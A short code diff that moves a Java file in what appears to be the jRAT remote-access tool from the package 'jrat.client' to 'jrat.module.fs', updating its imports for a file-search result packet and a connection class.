@@ -1,6 +1,7 @@
-package jrat.client;
+package jrat.module.fs;
 
-import jrat.client.packets.outgoing.Packet37SearchResult;
+import jrat.client.Connection;
+import jrat.module.fs.packets.Packet37SearchResult;
 
 import java.nio.file.FileSystems;
 import java.nio.file.FileVisitResult;
